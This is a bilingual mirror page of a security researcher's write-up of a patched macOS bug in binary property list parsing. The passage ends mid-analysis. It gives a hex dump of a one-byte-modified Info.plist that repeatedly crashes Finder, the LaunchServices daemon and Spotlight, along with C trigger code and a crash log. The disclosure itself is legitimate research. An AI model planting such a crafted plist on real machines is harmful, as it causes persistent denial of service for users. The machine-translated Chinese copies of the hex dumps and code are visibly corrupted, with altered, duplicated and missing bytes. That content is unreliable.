<!doctype html><html lang="zh-hans"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><title>å±æ€§åˆ—è¡¨è§£æé”™è¯¯ï¼šé€šè¿‡æ ¼å¼é”™è¯¯çš„äºŒè¿›åˆ¶plistä½¿MacOSå´©æºƒ</title><link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous"><link rel="stylesheet" href="/img/css.css?random="><link data-rh="true" rel="icon" href="/img/favicon.ico"/><script>var _hmt = _hmt || [];(function() {var hm = document.createElement("script");hm.src = "https://hm.baidu.com/hm.js?03c1a0f31299b4a2fbb83c34d6beaac9";var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();</script><script data-ad-client="ca-pub-6067137220025946" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script type="text/javascript" src="https://platform-api.sharethis.com/js/sharethis.js#property=5effb96910009800120b8d4d&product=inline-share-buttons" async="async"></script></head><body><div id="my_header"><div class="container"><nav class="navbar navbar-expand-lg"><a class="navbar-brand" href="/"><img alt="diglog" src="/img/logo.v1.gif" class="rounded-sm"></a><button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button><div class="collapse navbar-collapse" id="navbarNavAltMarkup"><div class="navbar-nav"></div></div></nav></div></div><div class="container"><div id="my_content"><h1 class="page_narrow">å±æ€§åˆ—è¡¨è§£æé”™è¯¯ï¼šé€šè¿‡æ ¼å¼é”™è¯¯çš„äºŒè¿›åˆ¶plistä½¿MacOSå´©æºƒ</h1><div class="row"><div class="col-lg-12 col-12"><div class="my_story_list_item shadow p-3 mb-5 bg-white rounded"><div class="story_page_pub_time page_narrow">2020-10-28 13:25:16</div><div class="story_img_container"><a href="http://img2.diglog.com/img/2020/10/ab24626cf94574f27161ca9d0057adb1.png"><img src="http://img2.diglog.com/img/2020/10/ab24626cf94574f27161ca9d0057adb1.png" class="img-fluid my_story_img" onerror="this.style.display='none'"></a></div><div class="page_narrow text-break page_content"><p>In this guest blog post, the security researcher (and good friend) behind  @OSCartography, describes an interesting macOS bug related to parsing property lists.  The writeup was originally posted on his  personal site.   Mahalo for sharing! ğŸ¤©</p><p>åœ¨è¿™ç¯‡å®¢åº§åšå®¢æ–‡ç« ä¸­ï¼Œ@OSCartoographyèƒŒåçš„å®‰å…¨ç ”ç©¶å‘˜(ä¹Ÿæ˜¯å¥½æœ‹å‹)æè¿°äº†ä¸€ä¸ªä¸è§£æå±æ€§åˆ—è¡¨ç›¸å…³çš„æœ‰è¶£çš„MacOSé”™è¯¯ã€‚è¿™ç¯‡æ–‡ç« æœ€åˆå‘å¸ƒåœ¨ä»–çš„ä¸ªäººç½‘ç«™ä¸Šã€‚è°¢è°¢åˆ†äº«ï¼ğŸ¤©ã€‚</p><p>  Recently, I decided it was time to go down another Operating System rabbit hole and macOS looked interesting enough especially since I knew little of the internals even though I regularly use Apple products. Learning a new OS is always an adventure, but I typically need a specific goal to ground my exploration and measure success in some way. Therefore, I set a goal of local exploitation through a single file being placed on a macOS system and let the analysis challenge begin. After only a few weeks I came across an interesting bug related to property lists which this post goes into more detail about. The bug was reported to Apple in May 2020 and patched â€¦although no CVE was issued.</p><p>æœ€è¿‘ï¼Œæˆ‘å†³å®šæ˜¯æ—¶å€™è¿›å…¥å¦ä¸€ä¸ªæ“ä½œç³»ç»Ÿå…”å­æ´äº†ï¼ŒMacOSçœ‹èµ·æ¥è¶³å¤Ÿæœ‰è¶£äº†ï¼Œç‰¹åˆ«æ˜¯å› ä¸ºæˆ‘å¯¹å®ƒçš„å†…éƒ¨ç»“æ„çŸ¥ä¹‹ç”šå°‘ï¼Œå°½ç®¡æˆ‘ç»å¸¸ä½¿ç”¨è‹¹æœçš„äº§å“ã€‚å­¦ä¹ ä¸€ä¸ªæ–°çš„æ“ä½œç³»ç»Ÿæ°¸è¿œæ˜¯ä¸€æ¬¡å†’é™©ï¼Œä½†æˆ‘é€šå¸¸éœ€è¦ä¸€ä¸ªå…·ä½“çš„ç›®æ ‡æ¥ä¸ºæˆ‘çš„æ¢ç´¢å¥ å®šåŸºç¡€ï¼Œå¹¶ä»¥æŸç§æ–¹å¼è¡¡é‡æˆåŠŸä¸å¦ã€‚å› æ­¤ï¼Œæˆ‘è®¾å®šäº†é€šè¿‡å°†å•ä¸ªæ–‡ä»¶æ”¾åœ¨MacOSç³»ç»Ÿä¸Šæ¥è¿›è¡Œæœ¬åœ°æ”»å‡»çš„ç›®æ ‡ï¼Œå¹¶è®©åˆ†ææŒ‘æˆ˜å¼€å§‹ã€‚ä»…ä»…å‡ å‘¨åï¼Œæˆ‘å°±å‘ç°äº†ä¸€ä¸ªä¸å±æ€§åˆ—è¡¨ç›¸å…³çš„æœ‰è¶£çš„bugï¼Œæœ¬æ–‡å°†å¯¹æ­¤è¿›è¡Œæ›´è¯¦ç»†çš„ä»‹ç»ã€‚è¯¥æ¼æ´äº2020å¹´5æœˆæŠ¥å‘Šç»™è‹¹æœå…¬å¸ï¼Œå¹¶ä¸ºâ€¦æ‰“äº†è¡¥ä¸ã€‚è™½ç„¶æ²¡æœ‰å‘å‡ºCVEã€‚</p><p>  Property lists ( plists) are files that store serialized objects and are prevalant in Appleâ€™s Operating Systems similar to how Microsoft Windows uses the Registry to store configuration data. An example XML-based property list for the macOS application  Automator is shown below. This property list stores version information for the application as well as other useful data:</p><p>å±æ€§åˆ—è¡¨(Plist)æ˜¯å­˜å‚¨åºåˆ—åŒ–å¯¹è±¡çš„æ–‡ä»¶ï¼Œåœ¨Appleæ“ä½œç³»ç»Ÿä¸­éå¸¸æµè¡Œï¼Œç±»ä¼¼äºMicrosoft Windowsä½¿ç”¨æ³¨å†Œè¡¨å­˜å‚¨é…ç½®æ•°æ®çš„æ–¹å¼ã€‚MacOSåº”ç”¨ç¨‹åºAutomatorçš„åŸºäºXMLçš„å±æ€§åˆ—è¡¨ç¤ºä¾‹å¦‚ä¸‹æ‰€ç¤ºã€‚æ­¤å±æ€§åˆ—è¡¨å­˜å‚¨åº”ç”¨ç¨‹åºçš„ç‰ˆæœ¬ä¿¡æ¯ä»¥åŠå…¶ä»–æœ‰ç”¨æ•°æ®ï¼š</p><p> 1 &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;  2 &lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; ...&gt;  3 &lt;plist  version= &#34;1.0&#34; &gt;  4 &lt;dict &gt;  5  &lt;key &gt;BuildAliasOf &lt;/key&gt;  6  &lt;string &gt;Automator &lt;/string&gt;  7  &lt;key &gt;BuildVersion &lt;/key&gt;  8  &lt;string &gt;383 &lt;/string&gt;  9  &lt;key &gt;CFBundleShortVersionString &lt;/key&gt; 10  &lt;string &gt;2.10 &lt;/string&gt; 11  &lt;key &gt;CFBundleVersion &lt;/key&gt; 12  &lt;string &gt;492 &lt;/string&gt; 13  &lt;key &gt;ProjectName &lt;/key&gt; 14  &lt;string &gt;Automator_executables &lt;/string&gt; 15  &lt;key &gt;SourceVersion &lt;/key&gt; 16  &lt;string &gt;492000000000000 &lt;/string&gt; 17 &lt;/dict&gt; 18 &lt;/plist&gt;</p><p>1&ltï¼›ï¼Ÿxmlç‰ˆæœ¬=&#34ï¼›1.0&#34ï¼›ç¼–ç =&#34ï¼›UTF-8&#34ï¼›ï¼Ÿ&gtï¼›2&ltï¼›ï¼DOCTYPE plist public&#34ï¼›-//APPLIST//DTD plist 1.0//en&#34ï¼›...&gtï¼›3&ltï¼›plistç‰ˆæœ¬=&#34ï¼›1.0&#34ï¼›&gtï¼›4&ltï¼›dict&gtï¼›5&ltï¼›key&gtï¼›BuildAliasOf&ltï¼›/key&ltï¼›6&ltï¼›string&gtï¼›Automator&ltï¼›/string&gtï¼›7&ltï¼›key&gtï¼›BuildVersion&ltï¼›/key&gtï¼›8&ltï¼›string&gtï¼›383&ltï¼›/string&gtï¼›9&ltï¼›key&gtï¼›CFBundleShortVersionString&ltï¼›/key&gtï¼›10&ltï¼›string&gtï¼›2.10&ltï¼›/string&gtï¼›11&ltï¼›key&gtï¼›CFBundleVersion&ltï¼›/key&gtï¼›12&ltï¼›string&gtï¼›492&ltï¼›/string&gtï¼›13&ltï¼›key&gtï¼›é¡¹ç›®åç§°&ltï¼›/key&gtï¼›14&ltï¼›string&gtï¼›Automator_Executable&ltï¼›/string&gtï¼›15&ltï¼›key&gtï¼›SourceVersion&ltï¼›/key&gtï¼›16&ltï¼›string&gtï¼›492000000000000&ltï¼›/string&gtï¼›17&ltï¼›/dict&gtï¼›18&ltï¼›/plist&gtï¼›ï¼›</p><p> Property lists can also be in binary form otherwise known as  bplists. As the name implies, these are property lists in a binary format that enable some additional object types and relationships including dictionaries. Below is an example bplist which can be identified by the  bplist00 tag although additional tags exist to support other versions of the format:</p><p>å±æ€§åˆ—è¡¨ä¹Ÿå¯ä»¥æ˜¯äºŒè¿›åˆ¶å½¢å¼ï¼Œä¹Ÿç§°ä¸ºbplistã€‚é¡¾åæ€ä¹‰ï¼Œè¿™äº›æ˜¯äºŒè¿›åˆ¶æ ¼å¼çš„å±æ€§åˆ—è¡¨ï¼Œæ”¯æŒä¸€äº›é¢å¤–çš„å¯¹è±¡ç±»å‹å’Œå…³ç³»ï¼ŒåŒ…æ‹¬å­—å…¸ã€‚ä¸‹é¢æ˜¯bplist00æ ‡è®°å¯ä»¥è¯†åˆ«çš„ç¤ºä¾‹bplistï¼Œå°½ç®¡å­˜åœ¨å…¶ä»–æ ‡è®°æ¥æ”¯æŒè¯¥æ ¼å¼çš„å…¶ä»–ç‰ˆæœ¬ï¼š</p><p> 00000000: 6270 6c69 7374 3030 d401 0203 0405 060a bplist00........00000010: 0b5f 1014 4e53 5374 6f72 7962 6f61 7264 ._..NSStoryboard00000020: 4d61 696e 4d65 6e75 5f10 254e 5356 6965 MainMenu_.%NSVie00000030: 7743 6f6e 7472 6f6c 6c65 7249 6465 6e74 wControllerIdent00000040: 6966 6965 7273 546f 4e69 624e 616d 6573 ifiersToNibNames00000050: 5f10 134e 5353 746f 7279 626f 6172 6456 _..NSStoryboardV00000060: 6572 7369 6f6e 5f10 224e 5356 6965 7743 ersion_.&#34;NSViewC00000070: 6f6e 7472 6f6c 6c65 7249 6465 6e74 6966 ontrollerIdentif00000080: 6965 7273 546f 5555 4944 7358 4d61 696e iersToUUIDsXMain00000090: 4d65 6e75 d207 0508 095f 1013 7369 6d75 Menu....._..simu000000a0: 6c61 746f 724d 6169 6e57 696e 646f 775f latorMainWindow_000000b0: 1013 7369 6d75 6c61 746f 724d 6169 6e57 ..simulatorMainW000000c0: 696e 646f 7758 4d61 696e 4d65 6e75 1001 indowXMainMenu..</p><p>00000000ï¼š6270 6c69 7374 3030 d401 0203 0405 060a bplist00.00000010ï¼š0b5f 1014 4e53 5374 6f72 7962 6f61 7264._.NSStoryboard00000020ï¼š4d61 696e 4d65 6e75 5f10 254e 5356 6965 MainMenu_.%NSVie00000030ï¼š7743 6f6e 7472 6f6c 6c65 7249 6465 6e74 wControllerIdent00000040ï¼š6966 6965 7273 546f 4e69 624e 616d 6573 TobNibStoryboard000050ï¼š5f10 134e 5353 746f 7279 626f 6172_NStoryboardV0060ï¼š6543 6f6e 7772 6f6c 6532c65 7249 6465 6e74 wControllerIdent00000040ï¼š6966 6965 7273 546f 4e69 624e 616d 6573 TobNibNamers624e 616d 6573ã€‚NSViewC00000070ï¼š6f6e 7472 6f6c 6c65 7249 6465 6e74 6966æ§ä»¶æ ‡è¯†ç¬¦Identif00000080ï¼š6965 7273 546f 5555 4944 7358 4d61 696e iersToUIDsXMain00000090ï¼š4d65 6e75 d207 0508 095f 1013 7369 6d75 Menu._.simu000000a0ï¼š6c61 746f 724d 6169 6169 6e57 696e 646f 775f latorMainWindow_000000b0ï¼š1013 7369 6d75 746d 724d 657ã€‚</p><p> The  bplist format can be better understood by looking at  Appleâ€™s opensource code and I also found  this reference to be extremely helpful. The  bplist format defined in Appleâ€™s opensource code is below:</p><p>é€šè¿‡æŸ¥çœ‹è‹¹æœçš„å¼€æºä»£ç å¯ä»¥æ›´å¥½åœ°ç†è§£bplistæ ¼å¼ï¼Œæˆ‘ä¹Ÿå‘ç°è¿™ä¸ªå‚è€ƒèµ„æ–™éå¸¸æœ‰å¸®åŠ©ã€‚è‹¹æœå¼€æºä»£ç ä¸­å®šä¹‰çš„bplistæ ¼å¼å¦‚ä¸‹ï¼š</p><p>  binary plist format Property lists provided an interesting target for fuzzing because they are simple to create and consumed by many parts of the OS including higher privileged processes. Appleâ€™s opensource code enabled me to create arbitrary  bplists and start to fuzz the file format while ensuring proper syntax with the built-in macOS  plutil command-line tool.</p><p>äºŒè¿›åˆ¶plistæ ¼å¼çš„å±æ€§åˆ—è¡¨æä¾›äº†ä¸€ä¸ªæœ‰è¶£çš„æ¨¡ç³Šç›®æ ‡ï¼Œå› ä¸ºå®ƒä»¬æ˜“äºåˆ›å»ºï¼Œå¹¶ä¸”å¯ä»¥ç”±æ“ä½œç³»ç»Ÿçš„è®¸å¤šéƒ¨åˆ†ä½¿ç”¨ï¼ŒåŒ…æ‹¬æ›´é«˜ç‰¹æƒçš„è¿›ç¨‹ã€‚è‹¹æœçš„å¼€æºä»£ç ä½¿æˆ‘èƒ½å¤Ÿåˆ›å»ºä»»æ„çš„bplistï¼Œå¹¶å¼€å§‹æ¨¡ç³Šæ–‡ä»¶æ ¼å¼ï¼ŒåŒæ—¶ä½¿ç”¨å†…ç½®çš„MacOS Plutilå‘½ä»¤è¡Œå·¥å…·ç¡®ä¿æ­£ç¡®çš„è¯­æ³•ã€‚</p><p>  I spent a few days generating bplists to exercise the format and quickly found that certain object types caused exceptions when being parsed by common macOS binaries such as  Finder and even higher privileged ones including  Launch Services daemon ( LSD). System crash logs indicated an issue in the  Core Foundation framework but, as we will see later, this bug exists in multiple locations.</p><p>æˆ‘èŠ±äº†å‡ å¤©æ—¶é—´ç”Ÿæˆbplistæ¥ç»ƒä¹ è¿™ç§æ ¼å¼ï¼Œå¹¶å¾ˆå¿«å‘ç°æŸäº›å¯¹è±¡ç±»å‹åœ¨è¢«å¸¸è§çš„MacOSäºŒè¿›åˆ¶æ–‡ä»¶(å¦‚Finderï¼Œç”šè‡³åŒ…æ‹¬å¯åŠ¨æœåŠ¡å®ˆæŠ¤ç¨‹åº(LSD)åœ¨å†…çš„æ›´é«˜ç‰¹æƒçš„äºŒè¿›åˆ¶æ–‡ä»¶)è§£ææ—¶ä¼šå¯¼è‡´å¼‚å¸¸ã€‚ç³»ç»Ÿå´©æºƒæ—¥å¿—è¡¨æ˜Core Foundationæ¡†æ¶ä¸­å­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œä½†æ­£å¦‚æˆ‘ä»¬ç¨åå°†çœ‹åˆ°çš„ï¼Œæ­¤é”™è¯¯å­˜åœ¨äºå¤šä¸ªä½ç½®ã€‚</p><p> Most of the generated crashes appeared to be caused by how  Core Foundation parses  bplists and subsequently attempts to use the created objects. Any  bplist that had objects within itâ€™s  ObjectTable that were not string types ( Date,  Data,  Bool, etc.) caused the parsing process to crash when calling non-existent string related selectors. The result was any process that used  Core Foundation to read property lists could be crashed with an unrecognized selector exception. An example vulnerable code path is below:</p><p>å¤§å¤šæ•°ç”Ÿæˆçš„å´©æºƒä¼¼ä¹æ˜¯ç”±Core Foundationè§£æbplistçš„æ–¹å¼ä»¥åŠéšåè¯•å›¾ä½¿ç”¨åˆ›å»ºçš„å¯¹è±¡å¼•èµ·çš„ã€‚åœ¨ObjectTableä¸­åŒ…å«éå­—ç¬¦ä¸²ç±»å‹(Dateã€Dataã€Boolç­‰)çš„å¯¹è±¡çš„ä»»ä½•bplistã€‚å¯¼è‡´åœ¨è°ƒç”¨ä¸å­˜åœ¨çš„å­—ç¬¦ä¸²ç›¸å…³é€‰æ‹©å™¨æ—¶è§£æè¿‡ç¨‹å´©æºƒã€‚ç»“æœæ˜¯ï¼Œä½¿ç”¨Core Foundationè¯»å–å±æ€§åˆ—è¡¨çš„ä»»ä½•è¿›ç¨‹éƒ½å¯èƒ½å´©æºƒï¼Œå¹¶å‡ºç°æ— æ³•è¯†åˆ«çš„é€‰æ‹©å™¨å¼‚å¸¸ã€‚ä»¥ä¸‹æ˜¯æ˜“å—æ”»å‡»çš„ä»£ç è·¯å¾„ç¤ºä¾‹ï¼š</p><p> CFBundleGetMainBundle &lt;-- exported function _CFBundleCreate CFBundleGetInfoDictionary _CFBundleRefreshInfoDictionaryAlreadyLocked _CFBundleCopyInfoDictionaryInDirectoryWithVersion _CFBundleInfoPlistProcessInfoDictionary CFStringFind CFStringFindWithOptionsAndLocale  CRASH!!! &lt;-- calls unrecognized selector</p><p>CFBundleGetMainBundle&ltï¼›--å¯¼å‡ºå‡½æ•°_CFBundleCreate CFBundleGetInfoDictionary_CFBundleRefresh InfoDictionaryAlreadyLocked_CFBundleCopyInfoDictionaryInDirectoryWithVersion_CFBundleInfoPlistProcessInfoDictionary CFStringFind CFStringFindWithOptionsAndLocale Crashï¼&ltï¼›--è°ƒç”¨æ— æ³•è¯†åˆ«çš„é€‰æ‹©å™¨ã€‚</p><p> Reaching this location was trivial with the following C code and a malicious property list named  Info.plist in the same directory as the test application:</p><p>ä½¿ç”¨æµ‹è¯•åº”ç”¨ç¨‹åºæ‰€åœ¨ç›®å½•ä¸­çš„ä»¥ä¸‹Cä»£ç å’Œåä¸ºInfo.plistçš„æ¶æ„å±æ€§åˆ—è¡¨ï¼Œå¯ä»¥è½»æ¾åˆ°è¾¾æ­¤ä½ç½®ï¼š</p><p> 1 # import &lt;CoreFoundation / CoreFoundation.h&gt;  2  int  main( int argc,  const  char  * argv[]) { 3 CFBundleRef myAppsBundle = NULL; 4 myAppsBundle  = CFBundleGetMainBundle(); 5  return  0; 6}</p><p>1#import&ltï¼›CoreFoundation/CoreFoundation.h&gtï¼›2 int main(int argcï¼Œconst char*argv[]){3 CFBundleRef myAppsBundle=nullï¼›4 myAppsBundle=CFBundleGetMainBundle()ï¼›5 return 0ï¼›6}ã€‚</p><p>  Generating crashes for this bug can be done programmatically or by placing a modified bplist on the system where it will automatically be parsed. In fact, one of the first signs of this bug was  LSD repeatedly crashing on my system while trying to register an application with my modified property list.</p><p>ç”Ÿæˆæ­¤é”™è¯¯çš„å´©æºƒå¯ä»¥é€šè¿‡ç¼–ç¨‹æ–¹å¼å®Œæˆï¼Œä¹Ÿå¯ä»¥é€šè¿‡å°†ä¿®æ”¹åçš„bplistæ”¾åœ¨ç³»ç»Ÿä¸Šè‡ªåŠ¨è§£ææ¥å®Œæˆã€‚äº‹å®ä¸Šï¼Œè¿™ä¸ªé”™è¯¯çš„æœ€åˆè¿¹è±¡ä¹‹ä¸€æ˜¯ï¼Œå½“æˆ‘è¯•å›¾ç”¨ä¿®æ”¹åçš„å±æ€§åˆ—è¡¨æ³¨å†Œåº”ç”¨ç¨‹åºæ—¶ï¼ŒLSDåœ¨æˆ‘çš„ç³»ç»Ÿä¸Šåå¤å´©æºƒã€‚</p><p> Objective-See has a great blog post, detailing application registration through LSD and the automatic parsing of property lists.   Read: &#34; Click File, App Opens&#34;</p><p>ç›®æ ‡-Seeæœ‰ä¸€ç¯‡å¾ˆæ£’çš„åšå®¢æ–‡ç« ï¼Œè¯¦ç»†ä»‹ç»äº†é€šè¿‡LSDæ³¨å†Œåº”ç”¨ç¨‹åºå’Œè‡ªåŠ¨è§£æå±æ€§åˆ—è¡¨ã€‚é˜…è¯»ï¼š&#34ï¼›ç‚¹å‡»æ–‡ä»¶ï¼Œåº”ç”¨ç¨‹åºæ‰“å¼€&#34ï¼›</p><p> The image below is  Console output showing how often crashes occurred with a modified  bplist on my desktop posing as a legitimate  Info.plist. Also note the User-level and System-level processes crashing.</p><p>ä¸‹å›¾æ˜¯æ§åˆ¶å°è¾“å‡ºï¼Œæ˜¾ç¤ºäº†åœ¨æˆ‘çš„æ¡Œé¢ä¸Šä¼ªè£…æˆåˆæ³•çš„Info.plistçš„ä¿®æ”¹åçš„bplistå‘ç”Ÿå´©æºƒçš„é¢‘ç‡ã€‚è¿˜è¦æ³¨æ„ç”¨æˆ·çº§å’Œç³»ç»Ÿçº§è¿›ç¨‹å´©æºƒã€‚</p><p>  LSD crashes Creating malicious  bplists can be done by modifying a single byte to change an ASCII string object (type  0x5X) to another object type such as DATE (type  0x33). An example modified  bplist is below:</p><p>é€šè¿‡ä¿®æ”¹å•ä¸ªå­—èŠ‚å°†ASCIIå­—ç¬¦ä¸²å¯¹è±¡(ç±»å‹0x5X)æ›´æ”¹ä¸ºå¦ä¸€ä¸ªå¯¹è±¡ç±»å‹(å¦‚DATE(ç±»å‹0x33))ï¼Œå¯ä»¥å®Œæˆåˆ›å»ºæ¶æ„bplistçš„LSDå´©æºƒã€‚ä¿®æ”¹åçš„bplistç¤ºä¾‹å¦‚ä¸‹ï¼š</p><p> 00000000: 6270 6c69 7374 3030 d401 0203 0405 060a bplist00........00000010: 0b5f 1014 4e53 5374 6f72 7962 6f61 7264 ._..NSStoryboard00000020: 4d61 696e 4d65 6e75 5f10 254e 5356 6965 MainMenu_.%NSVie00000030: 7743 6f6e 7472 6f6c 6c65 7249 6465 6e74 wControllerIdent00000040: 6966 6965 7273 546f 4e69 624e 616d 6573 ifiersToNibNames00000050: 5f10 134e 5353 746f 7279 626f 6172 6456 _..NSStoryboardV00000060: 6572 7369 6f6e 5f10 224e 5356 6965 7743 ersion_.&#34;NSViewC00000070: 6f6e 7472 6f6c 6c65 7249 6465 6e74 6966 ontrollerIdentif00000080: 6965 7273 546f 5555 4944 7358 4d61 696e iersToUUIDsXMain00000090: 4d65 6e75 d207 0508 0933 1013 7369 6d75 Menu.....3..simu000000a0: 6c61 746f 724d 6169 6e57 696e 646f 775f latorMainWindow_000000b0: 1013 7369 6d75 6c61 746f 724d 6169 6e57 ..simulatorMainW000000c0: 696e 646f 7758 4d61 696e 4d65 6e75 1001 indowXMainMenu..</p><p>00000000ï¼š6270 6c69 7374 3030 d401 0203 0405 060a bplist00.00000010ï¼š0b5f 1014 4e53 5374 6f72 7962 6f61 7264._.NSStoryboard00000020ï¼š4d61 696e 4d65 6e75 5f10 254e 5356 6965 MainMenu_.%NSVie00000030ï¼š7743 6f6e 7472 6f6c 6c65 7249 6465 6e74 wControllerIdent00000040ï¼š6966 6965 7273 546f 4e69 624e 616d 6573 TobNibStoryboard000050ï¼š5f10 134e 5353 746f 7279 626f 6172_NStoryboardV0060ï¼š6543 6f6e 7772 6f6c 6532c65 7249 6465 6e74 wControllerIdent00000040ï¼š6966 6965 7273 546f 4e69 624e 616d 6573 TobNibNamers624e 616d 6573ã€‚NSViewC00000070ï¼š6f6e 7472 6f6c 6c65 7249 6465 6e74 6966æ§ä»¶æ ‡è¯†ç¬¦Identif00000080ï¼š6965 7273 546f 5555 4944 7358 4d61 696e iersToUIDsXMain00000090ï¼š4d65 6e75 d207 0508 0933 1013 7369 6d75 Menu...3.simu000000a0ï¼š6c61 746f 724d 6169 6169 6e57 696e 646f 775f latorMainWindow_000000b0ï¼š1013 7369 6d675 746d 6169ã€‚</p><p> This small one byte change can now be used to cause havoc on a macOS system and presumably iOS although that platform was not tested during this research. This approach also impacts multiple databases including  Spotlightâ€™s which becomes tainted with this malicious  Info.plist and repeatedly causes crashes even after reboot.</p><p>è¿™ä¸ªå°å°çš„ä¸€ä¸ªå­—èŠ‚çš„æ”¹å˜ç°åœ¨å¯ä»¥ç”¨æ¥å¯¹MacOSç³»ç»Ÿå’Œå¤§æ¦‚çš„iOSé€ æˆä¸¥é‡ç ´åï¼Œå°½ç®¡è¯¥å¹³å°åœ¨æœ¬ç ”ç©¶æœŸé—´æ²¡æœ‰ç»è¿‡æµ‹è¯•ã€‚è¿™ç§æ–¹æ³•è¿˜ä¼šå½±å“å¤šä¸ªæ•°æ®åº“ï¼ŒåŒ…æ‹¬Spotlightæ•°æ®åº“ï¼Œå®ƒä¼šè¢«æ­¤æ¶æ„Info.plistæ±¡æŸ“ï¼Œç”šè‡³åœ¨é‡æ–°å¯åŠ¨åä¹Ÿä¼šåå¤å¯¼è‡´å´©æºƒã€‚</p><p>  With the ability to recreate crashes easily, I dug into where this bug actually lives. A simple approach to tracking this down was to look at the stack trace of a crashing process. Below is a crash log from the test application shown earlier that uses Core Foundation to read a malicious property list.</p><p>å‡­å€Ÿè½»æ¾é‡ç°å´©æºƒçš„èƒ½åŠ›ï¼Œæˆ‘æ·±å…¥äº†è§£äº†è¿™ä¸ªé”™è¯¯å®é™…å­˜åœ¨çš„åœ°æ–¹ã€‚è·Ÿè¸ªæ­¤é—®é¢˜çš„ä¸€ç§ç®€å•æ–¹æ³•æ˜¯æŸ¥çœ‹å´©æºƒè¿›ç¨‹çš„å †æ ˆè·Ÿè¸ªã€‚ä¸‹é¢æ˜¯æ¥è‡ªå‰é¢æ˜¾ç¤ºçš„ä½¿ç”¨Core Foundationè¯»å–æ¶æ„å±æ€§åˆ—è¡¨çš„æµ‹è¯•åº”ç”¨ç¨‹åºçš„å´©æºƒæ—¥å¿—ã€‚</p><p> 2020-07-06 09:31:14.433 OpenInfo[79624:2895718] *** Terminating app due to uncaught exception &#39;NSInvalidArgumentException&#39;, reason: &#39;-[__NSDate length]: unrecognized selector sent to instance 0x7fa546d033e0&#39;*** First throw call stack:( 0 CoreFoundation 0x00007fff2c0058ab __exceptionPreprocess + 250 1 libobjc.A.dylib 0x00007fff62126805 objc_exception_throw + 48 2 CoreFoundation 0x00007fff2c084b61 -[NSObject(NSObject) __retain_OA] + 0 3 CoreFoundation 0x00007fff2bf69adf ___forwarding___ + 1427 4 CoreFoundation 0x00007fff2bf694b8 _CF_forwarding_prep_0 + 120 5 CoreFoundation 0x00007fff2bf27676 CFStringFind + 45 6 CoreFoundation 0x00007fff2bf26cc8 _CFBundleInfoPlistProcessInfoDictionary + 194 7 CoreFoundation 0x00007fff2bf1faff _CFBundleCopyInfoDictionaryInDirectoryWithVersion + 1117 8 CoreFoundation 0x00007fff2bf1f349 _CFBundleRefreshInfoDictionaryAlreadyLocked + 111 9 CoreFoundation 0x00007fff2bf1f2c8 CFBundleGetInfoDictionary + 33 10 CoreFoundation 0x00007fff2c027d4f _CFBundleCreate + 715 11 CoreFoundation 0x00007fff2bf102aa CFBundleGetMainBundle + 148 12 OpenInfo 0x0000000109061f83 main + 35 13 libdyld.dylib 0x00007fff634947fd start + 1 14 ??? 0x0000000000000001 0x0 + 1)libc++abi.dylib: terminating with uncaught exception of type NSExceptionAbort trap: 6</p><p>2020-07-06 09ï¼š31ï¼š14.433 OpenInfo[79624ï¼š2895718]*æœªæ•è·å¼‚å¸¸å¯¼è‡´APPç»ˆæ­¢&#39ï¼›NSInvalidArgumentException&#39ï¼›åŸå› ï¼š&#39ï¼›-[__NSDate Length]ï¼šæ— æ³•è¯†åˆ«çš„é€‰æ‹©å™¨å‘é€åˆ°å®ä¾‹0x7fa546d033e0&#39ï¼›***First throw call stackï¼š(0 CoreFoundation 0x00007fff2c0058ab__exceptionPreprocess+250 1 libobjc.A.dylib 0x00007fff62126805 objc_exception_throw+48 2 CoreFoundation 0x00007fff2c084b61-[NSObject(NSObject)__retain_OA]+0 3 CoreFoundation 0x00007fff2bf69adf___forwarding___+1427 4 CoreFoundation 0x00007fff2bf694b8_CF_forwarding_prep_0+120 5 CoreFoundation 0x00007fff2bf27676 CFStringFind+45 6 CoreFoundation 0x00007fff2bf26cc8_CFBundleInfoPlistProcessInfoDictionary+194 7 CoreFoundation 0x00007fff2bf1faff_CFBundleCopyInfoDictionaryInDirectoryWithVersion+1117 8 CoreFoundation 0x00007fff2bf1f349_CFBundleRefreshInfoDictionaryAlreadyLocked+111 9 CoreFoundation 0x00007fff2bf1f2c8 CFBundleGetInfoDictionary+33 10 CoreFoundation 0x00007fff2c027d4f_CFBundleCreate+715 11 CoreFoundation 0x00007fff2bf102aa CFBundleGetMainBundle+148ã€‚12 OpenInfo 0x0000000109061f83 main+35 13 libdyld.dylib 0x00007fff634947fd start+1 14ï¼Ÿï¼Ÿ0x0000000000000001 0x0+1)libc++abi.dylibï¼šç»ˆæ­¢ï¼Œç±»å‹ä¸ºNSExceptionAbort Trapï¼š6ã€‚</p><p> It was helpful to  read the following article to understand how  Core Foundation handles unrecognized selector exceptions and clarified what  _CF_forwarding_prep_0 in the stack trace does. With this information, I treated the return address before this as the likely source of the exception which is in  CFStringFind â€¦specifically after a call to  _CFStringGetLength. The disassembly below illustrates this call:</p><p>é˜…è¯»ä¸‹é¢çš„æ–‡ç« æœ‰åŠ©äºç†è§£Core Foundationå¦‚ä½•å¤„ç†æ— æ³•è¯†åˆ«çš„é€‰æ‹©å™¨å¼‚å¸¸ï¼Œå¹¶é˜æ˜å †æ ˆè·Ÿè¸ªä¸­çš„_CF_FORWARING_PREP_0çš„ä½œç”¨ã€‚æœ‰äº†è¿™ä¸ªä¿¡æ¯ï¼Œæˆ‘å°†æ­¤ä¹‹å‰çš„è¿”å›åœ°å€è§†ä¸ºCFStringFindâ€¦ä¸­å¼‚å¸¸çš„å¯èƒ½æ¥æºã€‚ç‰¹åˆ«æ˜¯åœ¨è°ƒç”¨_CFStringGetLengthä¹‹åã€‚ä¸‹é¢çš„åæ±‡ç¼–è¯´æ˜äº†æ­¤è°ƒç”¨ï¼š</p><p>  CFStringFind 